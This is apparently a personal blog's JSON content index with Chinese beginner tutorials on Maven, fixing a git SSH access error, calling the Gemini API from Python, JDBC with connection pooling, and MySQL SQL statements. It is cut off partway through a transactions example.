{"meta":{"title":"myBlog","subtitle":"","description":null,"author":"Q","url":"http://example.com","root":"/"},"pages":[{"title":"tags","date":"2023-12-05T03:43:37.000Z","updated":"2023-12-05T10:19:13.443Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""},{"title":"categories","date":"2023-12-05T03:43:26.000Z","updated":"2023-12-05T10:16:39.080Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"Maven","slug":"Maven","date":"2024-01-20T10:40:51.484Z","updated":"2024-01-20T13:09:40.701Z","comments":true,"path":"2024/01/20/Maven/","permalink":"http://example.com/2024/01/20/Maven/","excerpt":"","text":"Maven是专门用于管理和构建Java项目的工具，它的主要功能有： 提供了一套标准化的项目结构 提供了一套标准化的构建流程（编译、测试、打包、发布…） 提供了一套依赖管理机制 基本使用 compile：编译 clean：清理 test：测试 package：打包 install：安装 生命周期 clean：清理 defaulit：核心工作 site：产生报告 IDEA配置Maven环境1.选择IDEA中File–&gt;Settings 2.搜索Maven 3.设置IDEA使用本地安装的Maven，并修改配置文件路径 Maven坐标详解什么是坐标？ Maven中的坐标是资源的唯一标识 使用坐标来定义项目或引入项目中需要的依赖 Maven坐标主要组成 groupld：定义当前Maven项目隶属组织名称（通常是域名反写） artifactld:定义当前Maven项目名称（通常是模块名称） version：定义当前项目版本号 IDEA创建Maven项目1.创建模块，选择Maven，点击Next 2.填写模块名称，坐标信息，点击finish，创建完成 3.编写hello world，并运行 IDEA导入Maven项目1.选择右侧Maven面板，点击 + 号 2.选择对应项目的pom.xml文件，双击即可 依赖管理使用坐标导入jar包 1.在pom.xml中编写 2.在标签中使用 3.定义坐标的groupld,artifactld,version 4.点击刷新按钮，使坐标生效 依赖范围通过设置坐标的依赖范围(scope)，可以设置对应jar包的作用范围：编译环境、测试环境、运行环境 scope默认值：compile 依赖范围 编译classpath 测试classpath 运行classpath 例子 compile y y y logback test - y - Junit provided y y - servet-api runtime - y y jdbc驱动 system y y - 存储在本地的jar包 import","categories":[{"name":"开发","slug":"开发","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/"},{"name":"Java","slug":"开发/Java","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://example.com/tags/Java/"}]},{"title":"git上传错误","slug":"git上传错误","date":"2024-01-20T06:13:33.925Z","updated":"2024-01-20T06:36:02.117Z","comments":true,"path":"2024/01/20/git上传错误/","permalink":"http://example.com/2024/01/20/git%E4%B8%8A%E4%BC%A0%E9%94%99%E8%AF%AF/","excerpt":"","text":"解决Please make sure you have the correct access rights and the repository exists 问题.解决:步骤一：删除.ssh下所有所有文件 步骤二: 12345678910111.设置用户名git config --global user.name &#x27;zhandehuang&#x27;2.设置用户名邮箱git config --global user.email &#x27;it_zdh@163.com&#x27;3.查看设置git config --list 然后继续输入命令:修改后面的邮箱即可 1ssh-keygen -t rsa -C “it_zdh@163.com” 步骤三： 配置：github 删除原ssh key ,添加新shh key 步骤四： 在所生成的rsa所在地址~&#x2F;.ssh下面的添加config并写入 1234567Host github.comHostName ssh.github.com # 这是最重要的部分User gitPort 443PreferredAuthentications publickeyIdentityFile ~/.ssh/id_rsa 去clone你github中的repo了，直接一个命令如下 12git clone “你从github repo中复制下来的链接”","categories":[{"name":"错误解决","slug":"错误解决","permalink":"http://example.com/categories/%E9%94%99%E8%AF%AF%E8%A7%A3%E5%86%B3/"}],"tags":[{"name":"错误解决","slug":"错误解决","permalink":"http://example.com/tags/%E9%94%99%E8%AF%AF%E8%A7%A3%E5%86%B3/"}]},{"title":"python调用Gemini接口","slug":"python调用Gemini接口","date":"2024-01-15T12:29:08.429Z","updated":"2024-01-15T12:52:07.729Z","comments":true,"path":"2024/01/15/python调用Gemini接口/","permalink":"http://example.com/2024/01/15/python%E8%B0%83%E7%94%A8Gemini%E6%8E%A5%E5%8F%A3/","excerpt":"","text":"开发环境满足以下要求： Python 3.9+ jupyter 安装。 步骤1.使用 pip 安装依赖项 1pip install -q -U google-generativeai 2.导入必要的包。 1import google.generativeai as genai 3.获取密钥 4.设置 API 密钥 1genai.configure(api_key=GOOGLE_API_KEY,transport=&#x27;rest&#x27;) 5.设置模型 1model = genai.GenerativeModel(&#x27;gemini-pro&#x27;) 6.输入问题 1response = model.generate_content(&quot;你对信息安全专业怎么看？&quot;) 7.输出答案 1print(response.text) 完整代码1234567import google.generativeai as genaigenai.configure(api_key=&quot;key&quot;,transport=&#x27;rest&#x27;)model = genai.GenerativeModel(&#x27;gemini-pro&#x27;)response = model.generate_content(&quot;你对信息安全专业怎么看？&quot;)print(response.text)","categories":[{"name":"开发","slug":"开发","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/"},{"name":"python","slug":"开发/python","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/python/"}],"tags":[{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"}]},{"title":"JDBC","slug":"JDBC","date":"2024-01-15T02:24:16.491Z","updated":"2024-01-17T13:51:19.498Z","comments":true,"path":"2024/01/15/JDBC/","permalink":"http://example.com/2024/01/15/JDBC/","excerpt":"","text":"JDBC是使用Java语言操作关系型数据库的一套API 导入JDBC下载 创建一个lib目录，复制粘贴到lib中 鼠标右键单击 jar包所在的lib文件夹，选择 Add as Library…， 将lib作为一个库添加进来： 鼠标右键单击 jar包所在的lib文件夹，选择 Add as Library…， 将lib作为一个库添加进来： 弹出窗口后，点击OK即可 快速入门123456789101112131415161718192021222324//1.添加jar包 //2.注册驱动 Class.forName(&quot;com.mysql.cj.jdbc.Driver&quot;); //3.通过驱动管理器获取连接对象 //3.1准备 URL： String url = &quot;jdbc:mysql://127.0.0.1:3306/company?useSSL=false&quot;; //3.2准备用户名： String username = &quot;root&quot;; //3.3准备密码： String password = &quot;1234&quot;; Connection conn = DriverManager.getConnection(url, username, password); //4.定义sql String sql = &quot;update emp set gender=2 where id=1&quot;; //5.获取执行sql的对象 Statement stmt = conn.createStatement(); //6.执行sql int count=stmt.executeUpdate(sql); //7.处理结果 System.out.println(count); //8.释放资源 stmt.close(); conn.close(); API详解DriverManager作用： 1.驱动管理 mysql 5之后的驱动包可以省略注册驱动的步骤 1Class.forName(&quot;com.mysql.cj.jdbc.Driver&quot;); 2.获取数据库连接 1Connection conn = DriverManager.getConnection(url, username, password); Connection作用： 1.获取执行SQL的对象 普通执行SQL对象 1Statement createStatement() 预编译SQL的执行SQL对象：防止SQL注入 1PreparedStatement prepareStatement(sql) 执行存储过程的对象 1CallableStatement prepareCall(sql) 2.管理事务 多个SQL对象一起执行，那么一起成功，那么一起失败 123开启事务：setAutoCommit(boolean autoCommit);true为自动提交事务，false为手动提交事务，即为开启事务提交事务：commit()回滚事务：rollback() Statement作用： 1.执行SQL语句 12int executeUpdate(sql); 执行DML、DDL语句返回值：（1）DML语句影响的行数（2）DDL语句执行后，执行成功也可能返回0 12ResultSet executeQuery(sql); 执行DQL语句返回值：ResultSet()结果集对象 ResultSet作用： 1.封装DQL查询语句的结果 1ResultSet stmt.executeQuery(sql); 执行DQL语句，返回ResultSet对象 获取查询结果 1234booean next(): （1）将光标从当前位置向前移动一行 （2）判断当前行是否为有效行 返回值： true：有效行，当前行数据 false：无效行，当前没有数据 12345xxx getXxx(参数)：获取数据xxx:数据类型；如：int getInt(参数); String getString(参数)参数： int：列的编号，从1开始 String：列的名称 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119package pojo;public class User &#123; private int id; private String username; private int gender; public User() &#123; &#125; public User(int id, String username, int gender) &#123; this.id = id; this.username = username; this.gender = gender; &#125; /** * 获取 * @return id */ public int getId() &#123; return id; &#125; /** * 设置 * @param id */ public void setId(int id) &#123; this.id = id; &#125; /** * 获取 * @return username */ public String getUsername() &#123; return username; &#125; /** * 设置 * @param username */ public void setUsername(String username) &#123; this.username = username; &#125; /** * 获取 * @return gender */ public int getGender() &#123; return gender; &#125; /** * 设置 * @param gender */ public void setGender(int gender) &#123; this.gender = gender; &#125; public String toString() &#123; return &quot;User&#123;id = &quot; + id + &quot;, username = &quot; + username + &quot;, gender = &quot; + gender + &quot;&#125;&quot;; &#125;&#125;package jdbc;import pojo.User;import java.sql.*;public class Main &#123; public static void main(String[] args) throws SQLException, ClassNotFoundException &#123; //1.添加jar包 //2.加载驱动 Class.forName(&quot;com.mysql.cj.jdbc.Driver&quot;); //3.通过驱动管理器获取连接对象 //3.1准备 URL： String url = &quot;jdbc:mysql://127.0.0.1:3306/company?useSSL=false&quot;; //3.2准备用户名： String username = &quot;root&quot;; //3.3准备密码： String password = &quot;1234&quot;; Connection conn = DriverManager.getConnection(url, username, password); //4.定义sql String sql = &quot;select * from emp&quot;; //5.获取执行sql的对象 Statement stmt = conn.createStatement(); //6.执行sql ResultSet count=stmt.executeQuery(sql); //7.处理结果 while(count.next()) &#123; User user= new User(); int id=count.getInt(1); String name=count.getString(2); int gender=count.getInt(5); user.setId(id); user.setUsername(name); user.setGender(gender); System.out.println(user); &#125; //8.释放资源 stmt.close(); conn.close(); &#125;&#125; PreparedStatement作用： 1.预编译SQL语句并执行，预防SQL注入 使用 获取PrepareStatement对象 12345//SQL语句中的参数值使用?占位符替代Sring sql=&quot;select * from user where username=? and password=?&quot;;//通过Connection对象获取，并传入对应的SQL语句PreparedStatement pstmt=conn.prepareStatement(sql); 设置初始值 12345PreparedStatement()对象：setXxx(参数1,参数2)：给？赋值Xxx:数据类型:如：setInt(参数1,参数2)参数： 参数1：？的位置编码，从1开始 参数2：？的值 执行SQL 1executeUpdate();/executeQuery() :不需要传递Sql 完整代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455package jdbc;import pojo.User;import java.sql.*;public class Main &#123; public static void main(String[] args) throws SQLException, ClassNotFoundException &#123; //1.添加jar包 //2.加载驱动 Class.forName(&quot;com.mysql.cj.jdbc.Driver&quot;); //3.通过驱动管理器获取连接对象 //3.1准备 URL： String url = &quot;jdbc:mysql://127.0.0.1:3306/company?useSSL=false&quot;; //3.2准备用户名： String username = &quot;root&quot;; //3.3准备密码： String password = &quot;1234&quot;; Connection conn = DriverManager.getConnection(url, username, password); String name=&quot;jinyong&quot;; String pwd=&quot;123456&quot;; //4.定义sql String sql = &quot;select * from emp where username=? and password=?&quot;; //5.获取执行sql的对象 PreparedStatement pstmt = conn.prepareStatement(sql); //位置？的值 pstmt.setString(1,name); pstmt.setString(2,pwd); //6.执行sql ResultSet count=pstmt.executeQuery(); //7.处理结果 count.next(); User user = new User(); int id = count.getInt(1); String names = count.getString(2); int gender = count.getInt(5); user.setId(id); user.setUsername(names); user.setGender(gender); System.out.println(user); //8.释放资源 pstmt.close(); conn.close(); &#125;&#125; 连接池 数据库连接池是一个容器，负责分配，管理数据库连接 它允许应用程序重复使用一个现有的数据库连接，而不是再重新建立一个 释放空闲空间超过最大空闲空间的数据库连接来避免因为没有释放数据库连接而引起的数据库连接遗漏 实现 标准接口：DataSource() ​ 官方提供的数据库连接池标准接口，由第三方组织实现此接口 ​ 功能：获取连接 1Connection getConnection() Driud连接池使用 1.导入jar包 2.定义配置文件 123456789101112131415161718driverClassName=com.mysql.cj.jdbc.Driver#URL连接数据库的URL，其中travel（以下面例子来说）为连接的数据库，后面的参数可不改但不删url=jdbc:mysql://localhost:3306/company?useSSL=false&amp;allowPublicKeyRetrieval=true&amp;serverTimezone=UTC&amp;characterEncoding=utf8characterEncoding=utf-8#安装mysql时候设置的用户与密码username=rootpassword=1234#初始化物理连接的个数initialSize=5#最大连接池数量maxActive=10#获取连接时最大等待时间maxWait=3000#用来检测连接是否有效的sqlvalidationQuery=SELECT 1#保证安全性！testWhileIdle=true 3.编写代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455package driud;import com.alibaba.druid.pool.DruidDataSourceFactory;import pojo.User;import javax.sql.DataSource;import java.io.IOException;import java.io.InputStream;import java.net.URL;import java.sql.Connection;import java.sql.PreparedStatement;import java.sql.ResultSet;import java.util.Properties;/** * druid测试 */public class DriudDemo &#123; public static void main(String[] args) throws Exception &#123; //加载配置文件 Properties pro = new Properties(); InputStream is =DriudDemo.class.getClassLoader().getResourceAsStream(&quot;druid.properties&quot;); pro.load(is); //获取连接池对象 DataSource datasource = DruidDataSourceFactory.createDataSource(pro); //获取连接 Connection cn = datasource.getConnection(); //定义sql String sql=&quot;select * from emp&quot;; //获取pstmt对象 PreparedStatement pstmt=cn.prepareStatement(sql); //设置参数 //执行sql ResultSet rs=pstmt.executeQuery(); System.out.println(cn); while (rs.next()) &#123; User user=new User(); int id = rs.getInt(&quot;id&quot;); String names = rs.getString(&quot;name&quot;); int gender = rs.getInt(&quot;gender&quot;); user.setId(id); user.setUsername(names); user.setGender(gender); System.out.println(user); &#125; pstmt.close(); cn.close(); &#125;&#125;","categories":[{"name":"开发","slug":"开发","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/"},{"name":"Java","slug":"开发/Java","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://example.com/tags/Java/"}]},{"title":"SQL语句","slug":"sql语句","date":"2024-01-13T13:51:43.370Z","updated":"2024-01-14T15:25:19.012Z","comments":true,"path":"2024/01/13/sql语句/","permalink":"http://example.com/2024/01/13/sql%E8%AF%AD%E5%8F%A5/","excerpt":"","text":"SQ语句可以单行或多行书写，以分号结尾 MySql数据库的SQL语句不区分大小写，关键字建议使用大写 注释 单行注释：– 注释内容或者 # 注释内容（MySql特有） 多行注释：&#x2F;*注释*&#x2F; DDL操作数据库查询当前用户1select user(); 查询用户的数据库1show databases; 创建数据库12--create database 库名;create database db1; 用户的数据库比较多时，使用条件语句创建 12--create database if not exists 库名;create database if not exists db1; 删除数据库12--drop database 库名;drop database db1; 判断删除数据库 12--drop database if exists 库名;drop database if exists db1; 使用数据库12--use 库名;use db1; 查询当前数据库1select database(); 操作表查询当前数据库的所有数据表1show tables; 查询数据库表结构12--desc 表名;desc tb_user; 创建数据表1234567891011121314/*create table 表名( 列名1 数据类型, 列名2 数据类型, 列名3 数据类型 ... ...);*/create table tb_user( id int, username varchar(20), password varchar(30)); 数据类型MySQL 支持多种类型，可以分为三类： 数值 1234567tinyint : 小整数型，占一个字节int ： 大整数类型，占四个字节 eg ： age intdouble ： 浮点类型 使用格式： 字段名 double(总长度,小数点后保留的位数) eg ： score double(5,2) 日期 123date ： 日期值。只包含年月日 eg ：birthday date ： datetime ： 混合日期和时间值。包含年月日时分秒 字符串 12345678char ： 定长字符串。 优点：存储性能高 缺点：浪费空间 eg ： name char(10) 如果存储的数据字符个数不足10个，也会占10个的空间varchar ： 变长字符串。 优点：节约空间 缺点：存储性能底 eg ： name varchar(10) 如果存储的数据字符个数不足10个，那就数据字符个数是几就占几个的空间 删除数据表 12--drop table 表名;drop table tb_user; 修改数据表1.修改表名12--alter table 表名 rename to 新的表名;alter table tb_user rename to tb_compan; 2.添加一列12--alter table 表名 add 列名 数据类型;alter table tb_compan add age int; 3.修改数据类型12--alter table 表名 modify 列名 新的数据类型;alter table tb_compan modify id tinyint; 4.修改列名和数据类型12--alter table 表名 change 列名 新列名 新数据类型alter table tb_compan change age sex tinyint; 5.删除列12--alter table 表名 drop 列名;alter table tb_compan drop sex; DML操作数据添加1.给指定列添加数据12--insert into 表名(列名1,列名2,...) values(值1,值2,...);insert into tb_compan(id,username,password) values(1,&quot;xiaomi&quot;,&quot;xiaomi&quot;); 2.给全部列添加数据12--insert into 表名 values(值1,值2,...);insert into tb_compan values(2,&quot;oppo&quot;,&quot;oppo&quot;); 3.批量添加数据1234--insert into 表名(列名1,列名2,...) values(值1,值2,...),(值1,值2,...),(值1,值2,...),...;insert into tb_compan(id,username,password) values(3,&quot;baidu&quot;,&quot;baidu&quot;),(4,&quot;huawei&quot;,&quot;huawei&quot;);--insert into 表名 values(值1,值2,...),(值1,值2,...),(值1,值2,...),...;insert into tb_compan values(5,&quot;vivo&quot;,&quot;vivo&quot;),(6,&quot;meizu&quot;,&quot;meizu&quot;); 修改1.修改表数据12--update 表名 set 列名1=值1,列名2=值2,... [where 条件]; 如果不加条件，所有数据都修改update tb_compan set username=&quot;redmi&quot;,password=&quot;redmi&quot; where id=1; 删除1.删除数据12--delete from 表名 [where 条件]; 如果不加条件，所有数据都删除delete from tb_compan where id=6; DQL查询语法12345678910111213141516/*select 字段列表from 表名列表where 条件列表group by 分组字段having 分组后条件order by 排序字段limit 分页限定*/ 1.基础查询a.查询多个字段1234--select 字段列表 from 表名;select username from tb_compan;--select * from 表名; 查询所有数据select * from tb_compan; b.去除重复记录12--select distinct 字段列表 from 表名;select distinct username from tb_compan; --如果有两个相同的username则只会显示一个 c.起别名12--as [别名]；as也可以省略select username as 用户名,password as 密码 from tb_compan; 2.条件查询a.条件查询语法12--select 字段列表 from 表名 where 条件列表;select username from tb_compan where id=4; b.条件 3.模糊查询12--select 字段列表 from 表名 where 字段 like 模糊条件列表; _匹配单个字符，%匹配任意字符select username from tb_compan where username like &quot;%m%&quot;; 4.排序查询1234--select 字段列表 from 表名 order by 排序字段名1 [排序方式1],排序字段名2 [排序方式2],...; --asc 升序 desc 降序 -- 当有多个排序方式时，当前面的条件值一样时，才会根据第二条件进行排序select username from tb_compan order by username asc; 5.分组查询a.聚合函数概念 将一列数据作为一个整体，进行纵向计算 聚合函数分类 函数名 功能 count(列名) 统计数量 max(列名) 最大值 min(列名) 最小值 sum(列名) 求和 avg(列名) 平均值 聚合函数语法 12--select 聚合函数名(列名) from 表；select avg(id) from tb_compan; b.分组查询语法123--select 字段列表 from 表名 [where 分组前条件限定] group by 分组字段名 [having 分组后条件过滤];select avg(id),count(*) from tb_compan where id&gt;1 group by id&gt;3 having count(*)&gt;1;--聚合条件用having 6.分页查询a.分页查询语法 12345678--select 字段列表 from 表名 limit 起始索引,查询条目数;--起始索引：从0开始--计算公式：起始索引=（当前页码-1）*每页显示的条数--分页查询limit是MySQL的方言--Oracle分页查询使用rownumber--SQL Server分页查询使用topselect * from tb_compan limit 3,3; --第一个3为从索引3开始，第二个3为显示3条数目（每页3条数，这是第二页），但是数据表从4开始时只有2条 DCLDCL用来管理数据库用户、控制数据库的访问权限 用户管理1.查询用户12use mysql;select * from user; 2.创建用户12--create user &#x27;用户名&#x27;@&#x27;主机名&#x27; identified by &#x27;密码&#x27;; 主机名限制主机IP访问，%可以在任意主机访问create user &#x27;admin&#x27;@&#x27;127.0.0.1&#x27; identified by &#x27;admin&#x27;; 3.修改用户密码12--alter user &#x27;用户名&#x27;@&#x27;主机名&#x27; identified by &#x27;新密码&#x27;;ALTER USER &#x27;admin&#x27;@&#x27;127.0.0.1&#x27; IDENTIFIED BY &#x27;123456&#x27;; 4.删除用户12--drop user &#x27;用户名&#x27;@&#x27;主机名&#x27;;drop user &#x27;admin&#x27;@&#x27;127.0.0.1&#x27;; 权限控制 权限 说明 all,all privileges 所有权限 select 查询数据 insert 插入数据 update 修改数据 delete 删除数据 alter 修改表 drop 删除数据库&#x2F;表视图 create 创建数据库&#x2F;表 1.查询权限12--show grants for &#x27;用户名&#x27;@&#x27;主机名&#x27;;show grants for &#x27;root&#x27;@&#x27;localhost&#x27;; 2.授予权限12--grant 权限列表 on 数据库.表名 to &#x27;用户名&#x27;@&#x27;主机名&#x27;;grant all on db1.tb_compan to &#x27;root&#x27;@&#x27;localhost&#x27;; 3.撤销权限1--revoke all on db1.tb_compan from &#x27;root&#x27;@&#x27;localhost&#x27;; 函数1.字符串函数 函数 concat(s1,s2,…,sn) 字符串拼接，将s1,s2,…sn拼接成一个字符串 lower(str) 将字符串str全部转化为小写 upper(str) 将字符串str全部转化为大写 lpad(str,n,pad) 左填充，用字符串pad对str的左边进行填充，达到n个字符串长度 rpad(str,n,pad) 右填充，用字符串pad对str的右边进行填充，达到n个字符串长度 trim(str) 去掉字符串头部和尾部的空格 substring(str,start,len) 返回从字符串str从start位置起的len个长度的字符串 1select concat(&#x27;hi&#x27;,&#x27; mysql&#x27;); 2.数值函数 函数 功能 ceil(x) 向上取整 floor(x) 向下取整 mod(x,y) 返回x&#x2F;y的模 rand() 返回0~1内的随机数 round(x,y) 求参数x的四舍五入的值，保留y位小数 1select ceil(1.1); 3.日期函数 函数 功能 curdate() 返回当前日期 curtime() 返回当前时间 now() 返回当前日期和时间 year(date) 获取指定date的年份 month(date) 获取指定date的月份 day(date) 获取指定date的日期 date_add(date,interval expr type) 返回一个日期&#x2F;时间值加上一个时间间隔expr后的时间值 datediff(date1,date2) 返回起始时间date1和结束时间date2之间的天数 1select curdate(); 4.流程函数 函数 功能 if(value,t,f) 如果value为true，则返回t，否则返回f ifnull(value1,value2) 如果value1为true，则返回value1，否则返回value2 case when [val1] then [res1] … else [default] end 如果val1为true，返回res1，… 否则返回default默认值 case [expr] when [val1] then [res1] … else [default] end 如果expr的值等于val1，返回res1，… 否则返回default默认值 约束概念 约束是作用于表中列上的规则，用于限制加入表的数据 约束的存在保证了数据库中数据的正确性、有效性和完整性 约束的分类 约束名称 描述 非空约束 保证列中所有数据不能有null值 not null 唯一约束 保证列中所有数据各不相同 unique 主键约束 主键是一行数据的唯一标识，要求非空且唯一 primary key 检查约束 保证列中的值满足某一条件 check 默认约束 保证数据时，未指定值则采用默认值 default 外键约束 外键用来让两个表的数据之间建立链接，保证数据的一致性和完整性 foreign key tip:MySql不支持检查约束 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253DROP TABLE IF EXISTS emp;-- 员工表CREATE TABLE emp ( id INT PRIMARY KEY auto_increment, -- 员工id，主键且自增长 ename VARCHAR(50) NOT NULL UNIQUE, -- 员工姓名，非空并且唯一 joindate DATE NOT NULL , -- 入职日期，非空 salary DOUBLE(7,2) NOT NULL , -- 工资，非空 bonus DOUBLE(7,2) DEFAULT 0 -- 奖金，如果没有奖金默认为0 );INSERT INTO emp(id,ename,joindate,salary,bonus) values(1,&#x27;张三&#x27;,&#x27;1999-11-11&#x27;,8800,5000);-- 演示主键约束：非空且唯一INSERT INTO emp(id,ename,joindate,salary,bonus) values(null,&#x27;张三&#x27;,&#x27;1999-11-11&#x27;,8800,5000);--报错，id不可为nullINSERT INTO emp(id,ename,joindate,salary,bonus) values(1,&#x27;张三&#x27;,&#x27;1999-11-11&#x27;,8800,5000);--报错，id为1已存在INSERT INTO emp(id,ename,joindate,salary,bonus) values(2,&#x27;李四&#x27;,&#x27;1999-11-11&#x27;,8800,5000);--成功-- 演示非空约束INSERT INTO emp(id,ename,joindate,salary,bonus) values(3,null,&#x27;1999-11-11&#x27;,8800,5000);--报错，name不可为null-- 演示唯一约束INSERT INTO emp(id,ename,joindate,salary,bonus) values(3,&#x27;李四&#x27;,&#x27;1999-11-11&#x27;,8800,5000);--name为李四已存在-- 演示默认约束INSERT INTO emp(id,ename,joindate,salary) values(3,&#x27;王五&#x27;,&#x27;1999-11-11&#x27;,8800);--成功，bonus默认为0INSERT INTO emp(id,ename,joindate,salary,bonus) values(4,&#x27;赵六&#x27;,&#x27;1999-11-11&#x27;,8800,null);--成功，bonus默认为0-- 演示自动增长：auto_increment：当列是数字类型并且 唯一约束INSERT INTO emp(ename,joindate,salary,bonus) values(&#x27;赵六&#x27;,&#x27;1999-11-11&#x27;,8800,null);--自动加idINSERT INTO emp(id,ename,joindate,salary,bonus) values(null,&#x27;赵六2&#x27;,&#x27;1999-11-11&#x27;,8800,null);--自动加idINSERT INTO emp(id,ename,joindate,salary,bonus) values(null,&#x27;赵六3&#x27;,&#x27;1999-11-11&#x27;,8800,null);--自动加idSELECT * from emp; 外键约束概念 外键用来让两个表的数据之间建立链接，保证数据的一致性和完整性 语法 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869/* 外键约束: * 外键用来让两个表的数据之间建立链接，保证数据的一致性和完整性 -- 创建表时添加外键约束 CREATE TABLE 表名( 列名 数据类型, … [CONSTRAINT] [外键名称] FOREIGN KEY(外键列名) REFERENCES 主表(主表列名) ); -- 建完表后添加外键约束 ALTER TABLE 表名 ADD CONSTRAINT 外键名称 FOREIGN KEY (外键字段名称) REFERENCES 主表名称(主表列名称); -- 删除约束 ALTER TABLE 表名 DROP FOREIGN KEY 外键名称; */-- 删除表DROP TABLE IF EXISTS emp;DROP TABLE IF EXISTS dept;-- 部门表CREATE TABLE dept( id int primary key auto_increment, dep_name varchar(20), addr varchar(20));-- 员工表 CREATE TABLE emp( id int primary key auto_increment, name varchar(20), age int, dep_id int, -- 添加外键 dep_id,关联 dept 表的id主键 CONSTRAINT fk_emp_dept FOREIGN KEY(dep_id) REFERENCES dept(id) );-- 添加 2 个部门insert into dept(dep_name,addr) values(&#x27;研发部&#x27;,&#x27;广州&#x27;),(&#x27;销售部&#x27;, &#x27;深圳&#x27;);-- 添加员工,dep_id 表示员工所在的部门INSERT INTO emp (NAME, age, dep_id) VALUES (&#x27;张三&#x27;, 20, 1),(&#x27;李四&#x27;, 20, 1),(&#x27;王五&#x27;, 20, 1),(&#x27;赵六&#x27;, 20, 2),(&#x27;孙七&#x27;, 22, 2),(&#x27;周八&#x27;, 18, 2);-- ------------------select * from emp;-- 删除外键alter table emp drop FOREIGN key fk_emp_dept;-- 建完表后，添加外键alter table emp add CONSTRAINT fk_emp_dept FOREIGN key(dep_id) REFERENCES dept(id); 数据库设计一对多（多对一） 如：部门表和员工表 一个部门对应多个员工，一个员工对应一个部门 实现方法：在多的一方建立外键，指向一的一方的主键 多对多 如：订单和商品 一个商品对应多个订单，一个订单对应多个商品 实现方法：建立第三个中间表，中间表至少包含2个外键，分别关联两方主键 1234567891011121314151617181920212223242526272829303132-- 删除表DROP TABLE IF EXISTS tb_order_goods;DROP TABLE IF EXISTS tb_order;DROP TABLE IF EXISTS tb_goods;-- 订单表CREATE TABLE tb_order( id int primary key auto_increment, payment double(10,2), payment_type TINYINT, status TINYINT);-- 商品表CREATE TABLE tb_goods( id int primary key auto_increment, title varchar(100), price double(10,2));-- 订单商品中间表CREATE TABLE tb_order_goods( id int primary key auto_increment, order_id int, goods_id int, count int);-- 建完表后，添加外键alter table tb_order_goods add CONSTRAINT fk_order_id FOREIGN key(order_id) REFERENCES tb_order(id);alter table tb_order_goods add CONSTRAINT fk_goods_id FOREIGN key(goods_id) REFERENCES tb_goods(id); 一对一 如：用户和用户详情 一对一关系多用于表拆分，将一个实体中经常使用的字段放一张表，不经常使用的字段放另一张表，用于提升查询性能 实现方式：在任意一方加入外键，关联另一方主键，并且设置外键为唯一(unique) 多表查询1.连接查询a.内连接内连接相当于查询A B交集数据 内连接查询语法 1234567--隐式内连接--select 字段列表 from 表1,表2,... where 条件;select * from emp,dept where emp.dep_id=dept.id;--显式内连接--select 字段列表 from 表1 [inner] join 表2 on 条件;select * from emp join dept on emp.dep_id=dept.id; b.外连接外连接查询语法 12345678910--左外链接--左外链接相当于查询A表所有数据和交集部分数据--select 字段列表 from 表1 left [outer] join 表2 on 条件；select * from emp left join dept on emp.dep_id=dept.id;--右外连接--右外连接相当于查询B表所有数据和交集部分数据--select 字段列表 from 表1 right [outer] join 表2 on 条件；select * from emp right join dept on emp.dep_id=dept.id; c.自连接自连接查询语法 1234--自连接查询，可以是内连接查询，也可以是外连接查询--select 字段列表 from 表1 别名1 join 表2 别名2 on 条件...;select a.name b.name from emp a emp b where a.managerid=b.id;--查询员工所属领导，managerid为所属领导idselect a.name b.name from emp a left join emp b no a.managerid=b.id;--查询员工所属领导,没有领导也查询 2.联合查询联合查询将多次查询的结果合并起来，形成一个新的查询结果集 联合查询语法 1234567/*select 字段列表 from 表1 ...union [all]select 字段列表 from 表2 ...;*/select * from emp where age&gt;18 union select *from emp where dep_id=1;--查询年龄大于18且在部门1中的员工（去重，加 all 不去重） 3.子查询a.子查询概念 查询中嵌套查询，称嵌套查询为子查询 b.子查询根据查询结果不同，作用不同： 单行单列 多行单列 多行多列 c.标量子查询 123--select 字段列表 from 表名 where 条件;--select * from emp where id&gt;(select id from emp where name=&quot;李四&quot;);--查询id大于李四的id的所有员工 d.列子查询 常用操作符：in、not in、any、some、all 操作符 描述 in 在指定的集合范围之内，多选一 not in 不在指定的集合范围之内 any 子查询返回列表中，有任意一个满足即可 some 与any等同，使用some的地方都可以使用any all 子查询返回列表的所有值都必须满足 12select * from emp where dep_id in (select dep_id from emp where name=&#x27;李四&#x27;);--查询与李四在同一部门的所有员工 e.行子查询 常用操作符：&#x3D;、&lt;&gt;、in、not in 12select * from emp where (dep_id,age)=((select dep_id from emp where name=&#x27;李四&#x27;),(select age from emp where name=&#x27;李四&#x27;));--查询与李四在同一部门和年龄相同的所有员工 f.表字查询 常用操作符：in 12select * from emp where (dep_id,age) in (select dep_id,age from emp where name=&#x27;李四&#x27; or name=&#x27;赵六&#x27;);--查询 （dep_id,age）in (1,20) or (2,20) 事务事务是一组操作的集合，它是一个不可分割的工作单位，事务会把所有的操作作为一个整体一起向系统提交或撤销操作请求，即这些操作要么同时成功，要么同时失败 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849--开启事务start transaction或者 begin--提交事务commit--回滚事务rollbackDROP TABLE IF EXISTS account;-- 创建账户表CREATE TABLE account( id int PRIMARY KEY auto_increment, name varchar(10), money double(10,2));-- 添加数据INSERT INTO account(name,money) values(&#x27;张三&#x27;,1000),(&#x27;李四&#x27;,1000);UPDATE account set money = 1000;select * from account;-- 开启事务BEGIN;-- 转账操作-- 1. 查询李四账户金额是否大于500-- 2. 李四账户 -500UPDATE account set money = money - 500 where name = &#x27;李四&#x27;;-- 出现异常了...-- 3. 张三账户 